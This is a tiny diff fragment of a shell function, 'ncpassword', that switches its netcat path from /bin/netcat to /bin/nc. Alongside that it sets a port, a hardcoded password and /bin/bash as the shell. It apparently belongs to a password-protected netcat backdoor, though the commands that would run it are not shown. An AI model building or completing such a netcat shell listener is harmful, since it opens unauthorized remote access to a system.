@@ -2,7 +2,7 @@
 
 ncpassword () 
 {
-	NC="/bin/netcat"
+	NC="/bin/nc"
 	PORT="870"
 	PASSWORD="sh4d0w4rmy"
 	SHELL="/bin/bash"
